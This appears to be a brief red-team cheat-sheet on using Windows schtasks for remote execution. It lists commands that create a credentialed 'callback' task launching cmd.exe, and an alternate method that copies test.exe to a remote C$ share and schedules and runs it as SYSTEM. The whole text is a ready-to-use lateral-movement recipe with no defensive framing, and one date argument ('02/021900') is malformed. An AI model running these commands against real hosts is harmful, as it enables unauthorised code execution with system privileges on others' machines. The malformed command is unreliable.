# Remote Schtasks
- schtasks /create /tn callback /s 127.0.0.1 /u user /p password /sc hour /st 02:00:00 /sd 04/21/2022 /tr cmd.exe
- schtasks /query /s 127.0.0.1
## Alternate method
copy test.exe \\192.192.192.192\c$
schtasks /create /s 192.192.192.192 /tn test /sc once /sd 02/021900 /st 00:00 /ru system /tr "C:\test.exe"
schtasks /s 192.192.192.192 /run /tn test